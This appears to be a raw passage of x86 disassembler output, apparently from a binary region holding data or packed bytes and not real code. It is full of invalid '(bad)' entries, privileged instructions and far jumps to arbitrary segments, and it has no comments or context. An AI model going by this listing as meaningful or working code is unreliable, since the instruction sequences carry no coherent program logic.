  404f91:	imul   edi,DWORD PTR [esi+edi*8+0x37],0xffffff94
  404f96:	dec    eax
  404f97:	cmp    esp,DWORD PTR [edx+edi*2]
  404f9a:	dec    ebx
  404f9b:	sub    DWORD PTR [ebp-0x7],edi
  404f9e:	adc    DWORD PTR [eax],esp
  404fa0:	outs   dx,BYTE PTR ds:[esi]
  404fa1:	popf   
  404fa2:	push   es
  404fa3:	xor    al,0x9
  404fa5:	jo     0x404f41
  404fa7:	sbb    al,0xca
  404fa9:	mov    al,ds:0x123e36d7
  404fae:	lods   eax,DWORD PTR ds:[esi]
  404fb0:	scas   al,BYTE PTR es:[edi]
  404fb1:	pop    sp
  404fb3:	mov    WORD PTR [edi-0x14bbf6f0],?
  404fb9:	(bad)  
  404fba:	mov    ebx,0x8eca09c9
  404fbf:	mov    dl,BYTE PTR [eiz*8+0x6245f8de]
  404fc6:	inc    ebp
  404fc7:	lods   al,BYTE PTR ds:[esi]
  404fc8:	retf   0xc2f8
  404fcb:	jno    0x404f5e
  404fcd:	and    esi,DWORD PTR [esi]
  404fcf:	loop   0x404f8f
  404fd1:	call   0x65833f8c
  404fd6:	retf   0xfd9b
  404fd9:	xchg   BYTE PTR [esi],dh
  404fdb:	sbb    al,0x7c
  404fdd:	fcomp  DWORD PTR ds:0xeedbc20d
  404fe3:	sub    BYTE PTR [ebp+0x72],cl
  404fe6:	inc    ebp
  404fe7:	arpl   si,cx
  404fe9:	mov    ebx,0x22c2aac8
  404fee:	or     edi,edx
  404ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff1:	jle    0x404ff0
  404ff3:	pop    edi
  404ff4:	test   BYTE PTR [edi],0xa
  404ff7:	xchg   ebx,eax
  404ff8:	mov    ah,0x5e
  404ffa:	loop   0x404fde
  404ffc:	arpl   WORD PTR [edi],bx
  404ffe:	push   cs
  404fff:	ss sahf 
  405001:	(bad)  
  405002:	shl    dl,0x9
  405005:	mov    edi,0xfd53ddc2
  40500a:	gs sub eax,0x85e802af
  405010:	cwde   
  405011:	inc    ebx
  405012:	lods   eax,DWORD PTR ds:[esi]
  405013:	outs   dx,DWORD PTR ds:[esi]
  405014:	aam    0x7d
  405016:	retf   
  405017:	add    BYTE PTR ds:0xebf923be,dh
  40501d:	mov    esp,0xa2e6524
  405022:	and    bh,BYTE PTR [ebx]
  405024:	add    ch,ah
  405026:	jge    0x40506a
  405028:	add    al,0x46
  40502a:	iret   
  40502b:	or     DWORD PTR [ecx-0x303633e6],edx
  405031:	mov    dh,0xfd
  405033:	outs   dx,BYTE PTR ds:[esi]
  405034:	sub    BYTE PTR [ebp+0x35ddc992],bl
  40503a:	push   esp
  40503b:	xchg   esi,eax
  40503c:	pop    ebp
  40503d:	inc    ebx
  40503e:	mov    edx,0xfa57ba2e
  405043:	adc    eax,0x43c7bae8
  405048:	ret    0x8fb1
  40504b:	nop
  40504c:	repz xchg esp,eax
  40504e:	ror    BYTE PTR [esp+ecx*8+0x56],0x47
  405053:	push   eax
  405054:	push   edx
  405055:	pop    esi
  405056:	ss leave 
  405058:	sbb    DWORD PTR [eax+ebp*8-0x7b],ebp
  40505c:	stc    
  40505d:	out    dx,al
  40505e:	rcl    DWORD PTR [edx],1
  405060:	daa    
  405061:	cmp    ch,BYTE PTR [edx+0x64a2ef8b]
  405067:	cmp    eax,0xee7eea8f
  40506c:	cmp    esi,DWORD PTR [ebp-0xcc41ea5]
  405072:	in     al,dx
  405073:	pop    es
  405074:	jo     0x405035
  405076:	or     DWORD PTR es:[eax],ecx
  405079:	sub    cl,dh
  40507b:	sub    DWORD PTR [esi-0x56],edx
  40507e:	push   ds
  40507f:	push   ds
  405080:	mov    ds:0xad5cfefb,eax
  405085:	xor    eax,0x135db6e6
  40508a:	mov    dl,BYTE PTR [ebx+0x4ee9261a]
  405090:	stos   BYTE PTR es:[edi],al
  405091:	adc    eax,DWORD PTR [esi]
  405093:	fwait
  405094:	push   0xffffffdd
  405096:	jo     0x40506e
  405098:	sbb    BYTE PTR [ebp-0x41],dh
  40509b:	mov    edi,0x232b1cc7
  4050a0:	mov    ebx,0xb30de7f5
  4050a5:	and    DWORD PTR [ecx-0x5e72b6f3],ebx
  4050ab:	fs in  eax,0x1d
  4050ae:	ja     0x405129
  4050b0:	adc    al,0x81
  4050b2:	sub    eax,0x9477987e
  4050b7:	(bad)  [esi+0x4daea787]
  4050bd:	add    edi,DWORD PTR [ebx-0x63]
  4050c0:	dec    esp
  4050c1:	popf   
  4050c2:	add    edi,DWORD PTR [ebp+0x23]
  4050c5:	repnz fsub st(1),st
  4050c8:	fnstsw WORD PTR ds:0x1e2ffe5
  4050ce:	xchg   ecx,eax
  4050cf:	cdq    
  4050d0:	cmc    
  4050d1:	ins    DWORD PTR es:[edi],dx
  4050d2:	xchg   ebp,eax
  4050d3:	mov    dl,0xc4
  4050d5:	int3   
  4050d6:	ds push ss
  4050d8:	jno    0x405145
  4050da:	push   esi
  4050db:	fadd   st,st(7)
  4050dd:	push   0x77
  4050df:	mov    ch,0xe0
  4050e1:	sub    edx,DWORD PTR [esi+0x3]
  4050e4:	inc    esi
  4050e5:	popa   
  4050e6:	mov    ecx,0x27065667
  4050eb:	fadd   DWORD PTR [esi-0x4732e424]
  4050f1:	ss inc esi
  4050f3:	ror    DWORD PTR [eax+0x40bbbed7],0xc5
  4050fa:	std    
  4050fb:	xchg   edx,eax
  4050fc:	jns    0x4050ed
  4050fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ff:	inc    esp
  405100:	sbb    esp,esp
  405102:	jmp    0x4050c5
  405104:	(bad)  
  405105:	ds pop ebp
  405107:	mov    edi,0x3b06f43a
  40510c:	in     eax,0x99
  40510e:	xor    al,0x62
  405110:	call   0x3587:0x7be9c6c4
  405117:	cmc    
  405118:	hlt    
  405119:	or     eax,0xc5db560a
  40511e:	sub    eax,DWORD PTR [ecx-0x66]
  405121:	push   es
  405122:	sub    esp,DWORD PTR [ecx-0x4b1198bc]
  405128:	jno    0x40514f
  40512a:	call   0x8353:0x7afb8b78
  405131:	(bad)  
  405132:	pop    ebp
  405133:	mov    ebx,0x5c5c737c
  405138:	sar    BYTE PTR [edi+0x1e],0x29
  40513c:	ret    
  40513d:	mov    eax,ds:0x5b268302
  405142:	fidivr WORD PTR [edi+0x7c]
  405145:	mov    bl,0xe8
  405147:	in     eax,0xcb
  405149:	xchg   esi,eax
  40514a:	dec    ecx
  40514b:	nop
  40514c:	fnsave [ecx+0x60ea9cf7]
  405152:	mov    ah,0x64
  405154:	arpl   bp,si
  405156:	dec    edx
  405157:	inc    esp
  405158:	dec    ebp
  405159:	aad    0x4f
  40515b:	mov    bh,0xff
  40515d:	xlat   BYTE PTR ds:[ebx]
  40515e:	push   edx
  40515f:	push   ecx
  405160:	outs   dx,BYTE PTR ds:[esi]
  405161:	xor    ebp,DWORD PTR [ebp-0x222931f4]
  405167:	pop    ebp
  405168:	add    DWORD PTR [edi],esp
  40516a:	cli    
  40516b:	and    BYTE PTR [ebp+0x3eb57f49],0xce
  405172:	or     eax,esp
  405174:	mov    bl,0x80
  405176:	stos   BYTE PTR es:[edi],al
  405177:	cmp    DWORD PTR [eax+ebp*4+0xa],esp
  40517b:	and    eax,0xd3611e23
  405180:	mov    dl,0x3a
  405182:	pop    ecx
  405183:	mov    eax,0xa58d9856
  405188:	xor    ecx,eax
  40518a:	xlat   BYTE PTR ds:[ebx]
  40518b:	nop
  40518c:	std    
  40518d:	dec    esp
  40518e:	into   
  40518f:	fwait
  405190:	cmp    BYTE PTR [edi],ah
  405192:	dec    edx
  405193:	das    
  405194:	pop    eax
  405195:	into   
  405196:	xchg   ah,cl
  405198:	mov    eax,0xb70f47ec
  40519d:	sahf   
  40519e:	call   0xd786:0x57e3aaf8
  4051a5:	mov    eax,0xfdbc76e4
  4051aa:	es push esi
  4051ac:	or     BYTE PTR [esi+ebp*2-0x5d],dh
  4051b0:	scas   eax,DWORD PTR es:[edi]
  4051b1:	mov    al,0xbe
  4051b3:	mov    ebp,0x8c6bbcd4
  4051b8:	xchg   ch,cl
  4051ba:	imul   DWORD PTR [edi]
  4051bc:	test   BYTE PTR [esi+0x23],cl
  4051bf:	push   edi
  4051c0:	jbe    0x405192
  4051c2:	js     0x405204
  4051c4:	push   ss
  4051c5:	push   esp
  4051c6:	adc    BYTE PTR [edx],al
  4051c8:	add    eax,0xce2af816
  4051cd:	lods   al,BYTE PTR ds:[esi]
  4051ce:	jmp    0xd08e:0x56a55e8d
  4051d5:	adc    dl,dh
  4051d7:	cmp    al,0xa1
  4051d9:	cmp    eax,0x4b373624
  4051de:	mov    bh,0x0
  4051e0:	imul   eax,DWORD PTR [ecx+0x19],0xdedb04c
  4051e7:	int3   
  4051e8:	dec    esp
  4051e9:	out    dx,al
  4051ea:	mov    cl,0x8b
  4051ec:	dec    edx
  4051ed:	(bad)  
  4051ee:	xchg   BYTE PTR [eax+ebp*4+0x57],ah
  4051f2:	test   BYTE PTR gs:[ebp+0x5d882770],cl
  4051f9:	jmp    0x493f:0x986d349a
  405200:	push   ss
  405201:	je     0x405253
  405203:	pop    ss
  405204:	adc    BYTE PTR [eax-0x50],bl
  405207:	inc    edi
  405208:	retf   0x519a
  40520b:	ret    0xba5
  40520e:	adc    ebp,esi
  405210:	cli    
  405211:	stos   BYTE PTR es:[edi],al
  405212:	loop   0x405287
  405214:	cmp    eax,0x56ae53b3
  405219:	cmp    edi,esi
  40521b:	and    al,0xe2
  40521d:	addr16 shl esp,cl
  405220:	inc    edx
  405221:	aaa    
  405222:	mov    esp,0x7fdb0d10
  405227:	and    BYTE PTR [ebx+eiz*4],ch
  40522a:	imul   edx,DWORD PTR [ebx],0x6a
  40522d:	dec    ebx
  40522e:	mov    ebx,0x549b1467
  405233:	(bad)
  405237:	inc    edi
  405238:	shl    DWORD PTR [esi+eax*1+0x62],1
  40523c:	dec    esp
  40523d:	sbb    ebp,ebp
  40523f:	repnz mov al,ds:0x1bbaa34a
  405245:	out    dx,al
  405246:	mov    bh,0x46
  405248:	adc    bh,bl
  40524a:	push   edx
  40524b:	cld    
  40524c:	mov    ch,0x41
  40524e:	cmp    eax,0x1fb1ad98
  405253:	loope  0x4052b8
  405255:	cs cli 
  405257:	dec    eax
  405258:	icebp  
  405259:	stos   DWORD PTR es:[edi],eax
  40525a:	jns    0x405288
  40525c:	mov    DWORD PTR [ecx+0x39],esp
  40525f:	sub    edx,DWORD PTR [ebx-0x3]
  405262:	test   DWORD PTR ds:0x312b40e8,ebp
  405268:	mov    DWORD PTR [edx+0x23b02de6],esp
  40526e:	ja     0x405299
  405270:	int    0xab
  405272:	loop   0x40528d
  405274:	je     0x405246
  405276:	pop    ds
  405277:	sbb    DWORD PTR ds:0x3b3391b6,edx
  40527d:	rcl    DWORD PTR [edx+0x5f7388d5],1
  405283:	push   edi
  405284:	push   eax
  405285:	popa   
  405286:	jl     0x405295
  405288:	lahf   
  405289:	call   0x3d4be2db
  40528e:	sub    BYTE PTR [ebx+eiz*4-0x5f],ah
  405292:	push   edi
  405293:	cmp    BYTE PTR [ebp-0x10b7f2fa],0x86
  40529a:	mov    esi,DWORD PTR [eax]
  40529c:	(bad)  
  40529d:	and    DWORD PTR [ebx+0x5a3eee2a],edx
  4052a3:	ins    DWORD PTR es:[edi],dx
  4052a4:	retf   
  4052a5:	test   al,0x12
  4052a7:	cmp    eax,esp
  4052a9:	rcl    DWORD PTR [eax-0x4],1
  4052ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ad:	cmc    
  4052ae:	mov    al,ds:0x609e4806
  4052b3:	data16 clc 
  4052b5:	lods   al,BYTE PTR ds:[esi]
  4052b6:	sub    ch,al
  4052b8:	add    al,0x1e
  4052ba:	clc    
  4052bb:	enter  0xf0c6,0x2d
  4052bf:	mov    bl,0x4a
  4052c1:	clc    
  4052c2:	loop   0x4052c1
  4052c4:	or     BYTE PTR [edi+0x5e659530],cl
  4052ca:	lods   al,BYTE PTR ds:[esi]
  4052cb:	das    
  4052cc:	xchg   ecx,eax
  4052cd:	xor    eax,0xb7497976
  4052d2:	xor    BYTE PTR [ebp+0x3158b10a],0xda
  4052d9:	mov    esp,0x28542857
  4052de:	inc    BYTE PTR [edi-0x35]
  4052e1:	pop    es
  4052e2:	aam    0xa0
  4052e4:	mov    bl,dl
  4052e6:	ins    DWORD PTR es:[edi],dx
  4052e7:	sbb    bh,BYTE PTR [ebp+ebx*8-0x1c9e5f18]
  4052ee:	(bad)  
  4052ef:	cmp    al,0x53
  4052f1:	jl     0x4052f8
  4052f3:	mov    edi,0x1e42e363
  4052f8:	iret   
  4052f9:	lods   eax,DWORD PTR ds:[esi]
  4052fa:	arpl   WORD PTR [ebp-0xef85f5d],di
  405300:	sar    edi,cl
  405302:	dec    ebp
  405303:	jge    0x405307
  405305:	out    0xa7,al
  405307:	out    0x9c,eax
  405309:	(bad)  
  40530a:	xor    al,0xd7
  40530c:	pop    es
  40530d:	cdq    
  40530e:	(bad)  
  405310:	mov    dh,0x23
  405312:	xor    DWORD PTR [ebx-0x56],ecx
  405315:	xor    ebx,DWORD PTR [esi]
  405317:	xor    DWORD PTR [ebp+0x17],0x6d9c6815
  40531e:	inc    ebp
  40531f:	mov    dl,0xa4
  405321:	jle    0x4052db
  405323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405324:	repnz fld TBYTE PTR [ebp-0x334f1f3]
  40532b:	jmp    0xc3c2412
  405330:	iret   
  405331:	sub    DWORD PTR [eax+esi*1-0x60ca891b],0xaeee4da0
  40533c:	stos   DWORD PTR es:[edi],eax
  40533d:	push   ebx
  40533e:	fiadd  DWORD PTR [eax]
  405340:	add    al,BYTE PTR [ebx-0x22]
  405343:	mov    edx,?
  405345:	in     al,0x16
  405347:	fdiv   st(3),st
  405349:	ficom  WORD PTR [eax+0x29ce6a63]
  40534f:	in     eax,dx
  405350:	shl    bh,0xbc
  405353:	inc    ebp
  405354:	ja     0x4053ca
  405356:	lahf   
  405357:	mov    bl,0xad
  405359:	fbld   TBYTE PTR ds:0xa38de23b
  40535f:	inc    esi
  405360:	pop    edx
  405361:	sahf   
  405362:	sub    al,0x50
  405364:	mov    ch,0x2a
  405366:	push   edi
  405367:	mov    ecx,0xbbffc999
  40536c:	shld   DWORD PTR [ebx],edx,0x90
  405370:	mov    dh,0x90
  405372:	je     0x405343
  405374:	mov    eax,0x372c442e
  405379:	les    esi,FWORD PTR [edi-0xa]
  40537c:	mov    ebx,edx
  40537e:	mov    ds:0x6edd3631,eax
  405383:	and    eax,0x1b56e240
  405388:	adc    edi,edx
  40538a:	add    esp,esp
  40538c:	addr16 lock push ebp
  40538f:	pop    esp
  405390:	test   al,0xa7
  405392:	in     eax,0x1e
  405394:	xchg   esp,eax
  405395:	push   eax
  405396:	jp     0x4053f9
  405398:	fnstsw WORD PTR [esi+eax*4-0x47cf4387]
  40539f:	pop    esp
  4053a0:	xor    bh,BYTE PTR [ebx]
  4053a2:	(bad)  
  4053a3:	push   esi
  4053a4:	dec    ebx
  4053a5:	pop    eax
  4053a6:	jmp    0x757e:0x57bd03c8
  4053ad:	xlat   BYTE PTR es:[ebx]
  4053af:	sbb    eax,0x2092dcf3
  4053b4:	jp     0x405368
  4053b6:	stos   BYTE PTR es:[edi],al
  4053b7:	xchg   DWORD PTR [edx],ebx
  4053b9:	arpl   WORD PTR [eax+0x23abae14],bp
  4053bf:	mov    bl,0x42
  4053c1:	add    ch,al
  4053c3:	xchg   edx,eax
  4053c4:	test   al,0x2
  4053c6:	pop    esi
  4053c7:	stc    
  4053c8:	inc    ebx
  4053c9:	or     al,0x17
  4053cb:	gs (bad) 
  4053cd:	jg     0x40544c
  4053cf:	(bad)  
  4053d0:	arpl   WORD PTR [edi+esi*4],cx
  4053d3:	popf   
  4053d4:	int    0x73
  4053d6:	imul   ecx,DWORD PTR [esi+0x5f524906],0xffffffe1
  4053dd:	mov    BYTE PTR [ecx+0x6fa6450f],cl
  4053e3:	cmp    al,0x87
  4053e5:	xchg   ecx,eax
  4053e6:	ficomp DWORD PTR [edi+ebp*8-0x7ac0b69f]
  4053ed:	mov    eax,ds:0x4ef0ef9
  4053f2:	arpl   WORD PTR [ebp+0x398505ad],sp
  4053f8:	shr    esi,cl
  4053fa:	mov    DWORD PTR [ebx-0x12],esp
  4053fd:	fsubr  st,st(7)
  4053ff:	sub    DWORD PTR [ecx+0x50],ecx
  405402:	sbb    DWORD PTR [edi],ecx
  405404:	mov    dl,BYTE PTR [edx]
  405406:	clc    
  405407:	jg     0x4053c3
  405409:	shl    esi,1
  40540b:	ins    DWORD PTR es:[edi],dx
  40540c:	mov    al,ds:0xa488e9b
  405411:	arpl   WORD PTR [ecx],bp
  405413:	mov    cs:0xf74e73eb,al
  405419:	loop   0x40545d
  40541b:	lea    ebp,[edi-0x401a001c]
  405421:	jle    0x405406
  405423:	dec    esp
  405424:	sti    
  405425:	jmp    FWORD PTR [edi-0xe]
  405428:	rcl    DWORD PTR [eax-0x476bdeb8],0x33
  40542f:	xor    al,0xbb
  405431:	popf   
  405432:	push   ss
  405433:	retf   
  405434:	adc    BYTE PTR [edi-0x30],dl
  405437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405438:	repnz dec edi
  40543a:	mov    eax,0x7f789242
  40543f:	wrmsr  
  405441:	pushaw 
  405443:	(bad)  
  405444:	push   esp
  405445:	test   al,0xbe
  405447:	sbb    al,0x9e
  405449:	gs jnp 0x4054c0
  40544c:	jb     0x40540e
  40544e:	repz pop ds
  405450:	sub    eax,0x1b6ed9a7
  405455:	xor    al,0x7e
  405457:	mov    cl,0x92
  405459:	shr    DWORD PTR [ebp+0x19],0x64
  40545d:	mov    ebx,0x776a1399
  405462:	sub    BYTE PTR [ecx+0x2e67f152],dh
  405468:	cmp    BYTE PTR [esp+ecx*1],bh
  40546b:	retf   0x7814
  40546e:	ficomp WORD PTR [edi-0x61]
  405471:	out    0xa1,al
  405473:	cwde   
  405474:	retf   0xa069
  405477:	push   es
  405478:	lahf   
  405479:	repz inc ecx
  40547b:	or     ch,ch
  40547d:	sbb    eax,0xc601499d
  405482:	add    eax,0x5e6059ad
  405487:	ret    0x1a3b
  40548a:	enter  0x5c7f,0xa0
  40548e:	arpl   WORD PTR [esi],bp
  405490:	mov    al,0xd4
  405492:	(bad)  
  405494:	mov    ah,0x42
  405496:	mov    cl,BYTE PTR [edx]
  405498:	out    dx,al
  405499:	pop    ecx
  40549a:	mov    esp,0xda1152d7
  40549f:	(bad)  
  4054a0:	test   eax,0x59a0667f
  4054a5:	pop    ds
  4054a6:	mov    ds:0xcd1f605c,eax
  4054ab:	cmp    al,0xdd
  4054ad:	test   dh,ch
  4054af:	push   eax
  4054b0:	pop    ds
  4054b1:	mov    es,WORD PTR ds:0x605093fc
  4054b7:	push   ds
  4054b8:	pop    edx
  4054b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ba:	inc    esi
  4054bb:	leave  
  4054bc:	test   DWORD PTR [esi-0x5a],ebx
  4054bf:	or     ecx,DWORD PTR [eax]
  4054c1:	push   esp
  4054c2:	xor    DWORD PTR [edx+0x38],0x64
  4054c6:	jmp    0x6a507226
  4054cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054cc:	add    BYTE PTR [ebp-0x6c],0xa8
  4054d0:	mov    ?,esi
  4054d2:	(bad)  [esi+0x5af213c2]
  4054d8:	and    eax,0x76884d20
  4054dd:	cli    
  4054de:	pop    ebx
  4054df:	and    esp,edx
  4054e1:	call   0xf8cd:0xc2f949d2
  4054e8:	adc    eax,0xf48c892b
  4054ed:	mov    dh,0xa9
  4054ef:	cmp    cl,al
  4054f1:	mov    BYTE PTR [esi],al
  4054f3:	bound  edx,QWORD PTR [ebx]
  4054f5:	add    eax,0x988050f3
  4054fa:	push   esp
  4054fb:	pop    ss
  4054fc:	test   al,0xbe
  4054fe:	xchg   ecx,eax
  4054ff:	pop    esi
  405500:	in     eax,dx
  405501:	(bad)  
  405503:	xor    DWORD PTR [ecx-0x52],ecx
  405506:	xchg   ebx,eax
  405507:	in     eax,0x61
  405509:	das    
  40550a:	adc    BYTE PTR [ebx-0x4c57877a],bl
  405510:	pushf  
  405511:	adc    bh,bl
  405513:	daa    
  405514:	jge    0x405566
  405516:	push   ebp
  405517:	cdq    
  405518:	xchg   ebp,eax
  405519:	xchg   BYTE PTR [edx-0x25],al
  40551c:	sbb    BYTE PTR [ebx-0x6c],al
  40551f:	imul   esi,DWORD PTR [esi+0x25],0x2c41ee95
  405526:	aas    
  405527:	hlt    
  405528:	gs adc edx,esp
  40552b:	jp     0x405542
  40552d:	add    dh,0xb0
  405530:	ret    0xa2ab
  405533:	mov    eax,ds:0x534c3bd0
  405538:	mov    ch,0x8
  40553a:	imul   edi,DWORD PTR [ecx+0x56d86c65],0x54
  405541:	pop    DWORD PTR [ebx-0xed1a62b]
  405547:	jne    0x405512
  405549:	xchg   edi,eax
  40554a:	repnz or BYTE PTR [edi+0x287b90d9],bl
  405551:	adc    bl,dl
  405553:	daa    
  405554:	sbb    cl,BYTE PTR [edi-0x35]
  405557:	adc    ch,BYTE PTR [edi-0x41ffa2e3]
  40555d:	mov    cl,0x3a
  40555f:	push   0xb896bfc6
  405564:	dec    edi
  405565:	xchg   ebx,esp
  405567:	ins    DWORD PTR es:[edi],dx
  405568:	push   ds
  405569:	adc    DWORD PTR [edx],ebp
  40556b:	sub    eax,0x60f82ba6
  405570:	sbb    eax,0x45525b7
  405575:	popf   
  405576:	jmp    0x405572
  405578:	push   ss
  405579:	rcr    BYTE PTR [edi-0x79],cl
  40557c:	pop    es
  40557d:	loop   0x40556c
  40557f:	aas    
  405580:	pop    edx
  405581:	xchg   DWORD PTR [eax+0x36],edx
  405584:	aam    0x30
  405586:	xor    BYTE PTR [edx-0x36],ch
  405589:	sar    BYTE PTR [ebp+0x27],cl
  40558c:	sub    al,0xa1
  40558e:	inc    BYTE PTR [ecx+0x49]
  405591:	mov    bh,0x81
  405593:	daa    
  405594:	mov    ecx,0xc270fdc7
  405599:	mov    ecx,0x92874acb
  40559e:	test   eax,0xdcf6595b
  4055a3:	jle    0x4055d1
  4055a5:	mov    DWORD PTR [esi-0x6],ebx
  4055a8:	gs ds push esi
  4055ab:	jne    0x4055ed
  4055ad:	hlt    
  4055ae:	gs (bad) 
  4055b0:	loopne 0x4055d5
  4055b2:	jbe    0x405597
  4055b4:	icebp  
  4055b5:	and    al,0x7e
  4055b7:	aas    
  4055b8:	call   0x1ca:0x5e87d450
  4055bf:	cld    
  4055c0:	mov    dh,0xe7
  4055c2:	mov    gs:0xccecb50b,eax
  4055c8:	push   0x3a
  4055ca:	mov    eax,ebp
  4055cc:	pop    ecx
  4055cd:	sbb    al,0xa0
  4055cf:	dec    edi
  4055d0:	jg     0x4055b2
  4055d2:	adc    eax,0xb4a44523
  4055d7:	mov    ebp,0x3314d86e
  4055dc:	mov    ecx,0x2213d2cd
  4055e1:	imul   BYTE PTR [ebp-0x58b26140]
  4055e7:	(bad)  
  4055e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055e9:	jno    0x40563d
  4055eb:	call   0x7425:0x4633527a
  4055f2:	push   esp
  4055f3:	inc    ecx
  4055f4:	jnp    0x405611
  4055f6:	int3   
  4055f7:	cdq    
  4055f8:	xor    BYTE PTR [edi-0x76369113],al
  4055fe:	jae    0x405589
  405600:	es push ds
  405602:	and    DWORD PTR [edi+esi*4],esi
  405605:	push   0xa3f8c395
  40560a:	icebp  
  40560b:	sub    eax,0x77833456
  405610:	mov    bl,0x62
  405612:	push   eax
  405613:	dec    esp
  405614:	push   eax
  405615:	cli    
  405616:	retf   
  405617:	xor    eax,0x214a5ff2
  40561c:	and    al,0x7b
  40561e:	xchg   esp,eax
  40561f:	cmc    
  405620:	pop    esi
  405621:	stos   DWORD PTR es:[edi],eax
  405622:	adc    BYTE PTR [eax],ch
  405624:	arpl   WORD PTR [eax+0x33be3ab8],bx
  40562a:	adc    dh,BYTE PTR [edi]
  40562c:	mov    bl,0x39
  40562e:	sahf   
  40562f:	adc    DWORD PTR [esi],eax
  405631:	pop    ebx
  405632:	stos   BYTE PTR es:[edi],al
  405633:	pop    edi
  405634:	mov    dh,0x67
  405636:	stos   BYTE PTR es:[edi],al
  405637:	lods   al,BYTE PTR ds:[esi]
  405638:	sbb    al,0x75
  40563a:	jecxz  0x405656
  40563c:	pop    ss
  40563d:	or     bh,BYTE PTR [ebx*8-0x3764ede0]
  405644:	(bad)  
  405645:	fcmovbe st,st(6)
  405647:	xor    eax,0x5382305b
  40564c:	les    edi,FWORD PTR [edi]
  40564e:	mov    al,0x72
  405650:	(bad)  
  405651:	jg     0x4055e4
  405653:	dec    edi
  405654:	xchg   bl,bh
  405656:	mov    esi,0xc6d11bd1
  40565b:	gs pop ebx
  40565d:	sub    al,0xe6
  40565f:	xchg   ebx,eax
  405660:	(bad)  
  405662:	and    DWORD PTR [ebp-0xa9604df],esi
  405668:	add    esi,edi
  40566a:	call   0x9010:0x71988e72
  405671:	test   DWORD PTR [eax+eax*2+0x42],edx
  405675:	push   edx
  405676:	inc    ebp
  405677:	dec    ebx
  405678:	jae    0x4056f5
  40567a:	sub    cl,BYTE PTR [ebx-0x5239cd89]
  405680:	ins    DWORD PTR es:[edi],dx
  405681:	jmp    0xc0bb62ec
  405686:	xor    DWORD PTR [ebx+0x1f],ebp
  405689:	push   cs
  40568a:	push   edi
  40568b:	je     0x4056a8
  40568d:	push   cs
  40568e:	sar    DWORD PTR [edi+0x47],1
  405691:	inc    eax
  405692:	in     al,0x2a
  405694:	inc    ebx
  405695:	test   BYTE PTR [ebx+ebx*2-0x13],ah
  405699:	jecxz  0x405698
  40569b:	cwde   
  40569c:	xlat   BYTE PTR ds:[ebx]
  40569d:	xlat   BYTE PTR ds:[ebx]
  40569e:	xchg   edx,edi
  4056a0:	jo     0x405625
  4056a2:	arpl   WORD PTR [edx+0x25],bp
  4056a5:	sbb    BYTE PTR [ecx],ah
  4056a7:	add    DWORD PTR [edi+0x22],esi
  4056aa:	push   ds
  4056ab:	scas   al,BYTE PTR es:[edi]
  4056ac:	sbb    eax,0x7f6e4f51
  4056b1:	jne    0x405699
  4056b3:	pop    ss
  4056b4:	push   ebp
  4056b5:	jle    0x4056fa
  4056b7:	sbb    al,0x2f
  4056b9:	lds    esi,FWORD PTR ds:0xfebf16a6
  4056bf:	loop   0x4056c5
  4056c1:	jmp    0x5fd2:0x8cd96ed2
  4056c8:	sub    eax,0xbedd06af
  4056cd:	cmp    edi,ebx
  4056cf:	(bad)  
  4056d1:	dec    edx
  4056d2:	dec    esi
  4056d3:	push   esp
  4056d4:	xchg   ebx,eax
  4056d5:	ret    
  4056d6:	cdq    
  4056d7:	call   0x9bd8370
  4056dc:	sbb    BYTE PTR [esi],ah
  4056de:	cdq    
  4056df:	leave  
  4056e0:	gs sub al,0xa9
  4056e3:	cdq    
  4056e4:	das    
  4056e5:	and    DWORD PTR [eax-0xd],ebx
  4056e8:	push   ds
  4056e9:	dec    edx
  4056ea:	sub    al,0x61
  4056ec:	call   0x8f932368
  4056f1:	and    dh,BYTE PTR [edx-0x4f]
  4056f4:	xlat   BYTE PTR ds:[ebx]
  4056f5:	outs   dx,DWORD PTR ds:[esi]
  4056f6:	pop    es
  4056f7:	mov    ah,0x0
  4056f9:	xchg   edi,ecx
  4056fb:	sbb    eax,0x8cf44e43
  405700:	inc    esi
  405701:	jp     0x40574c
  405703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405704:	aam    0xf9
  405706:	mov    ah,0xad
  405708:	popf   
  405709:	ficom  DWORD PTR [eax-0x68d30efb]
  40570f:	push   cs
  405710:	pop    edx
  405711:	add    ebx,ebp
  405713:	cwde   
  405714:	mov    edx,0xaa54e97d
  405719:	and    al,0xf5
  40571b:	stc    
  40571c:	adc    dl,BYTE PTR [ebx]
  40571e:	loope  0x4056a0
  405720:	sahf   
  405721:	div    DWORD PTR [ebp-0x74005bed]
  405727:	pop    ss
  405728:	adc    al,0x5
  40572a:	fisubr WORD PTR [edi]
  40572c:	pop    ecx
  40572d:	jmp    0x4056d4
  40572f:	ret    0x98d6
  405732:	lea    ebp,[edx+0x16eddab7]
  405738:	or     al,0xd0
  40573a:	loopne 0x4056dd
  40573c:	loope  0x405751
  40573e:	dec    esi
  40573f:	cdq    
  405740:	mov    dl,0x1c
  405742:	pop    ss
  405743:	icebp  
  405744:	jmp    0x4056f0
  405746:	pop    eax
  405747:	fild   DWORD PTR [ebp+edi*1+0x1b]
  40574b:	mov    esi,0x4ccf4ed5
  405750:	dec    eax
  405751:	xor    bh,dh
  405753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405754:	imul   esp,edx,0xe758a936
  40575a:	les    ecx,FWORD PTR [eax+ecx*4]
  40575d:	ss and al,0xd3
  405760:	mov    eax,ss:0x9d8a7ef
  405766:	mov    eax,ds:0x360bd60d
  40576b:	scas   eax,DWORD PTR es:[edi]
  40576c:	mov    edi,0xe310aa43
  405771:	mov    esi,0x7b10ecb0
  405776:	sub    eax,0x949fcf02
  40577b:	das    
  40577c:	sbb    BYTE PTR [ebx+0x6],bh
  40577f:	push   edx
  405780:	cmp    eax,0x1eccb812
  405785:	data16 scas al,BYTE PTR es:[edi]
  405787:	push   0xffffff91
  405789:	ret    
  40578a:	jo     0x40575a
  40578c:	sbb    bh,BYTE PTR [ebx]
  40578e:	sahf   
  40578f:	iret   
  405790:	ficom  DWORD PTR [ecx+edx*2+0x27]
  405794:	shr    DWORD PTR [ebx],cl
  405796:	jmp    0x7e8b:0x6603f13e
